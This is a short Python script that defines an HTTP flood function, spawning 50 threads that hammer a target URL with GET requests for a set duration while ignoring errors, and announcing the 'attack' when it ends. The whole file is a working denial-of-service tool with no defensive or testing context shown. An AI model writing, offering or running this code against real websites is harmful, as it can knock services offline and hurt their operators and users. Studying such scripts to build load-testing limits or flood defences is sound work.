import requests
import threading
import time

def run_http_flood(target_url, duration=10):
    print(f"[HTTP_FLOOD] Starting HTTP flood on {target_url} for {duration} seconds.")
    end_time = time.time() + duration

    def flood():
        while time.time() < end_time:
            try:
                requests.get(target_url, timeout=1)
            except requests.RequestException:
                pass

    threads = [threading.Thread(target=flood) for _ in range(50)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print("[HTTP_FLOOD] Attack finished.")
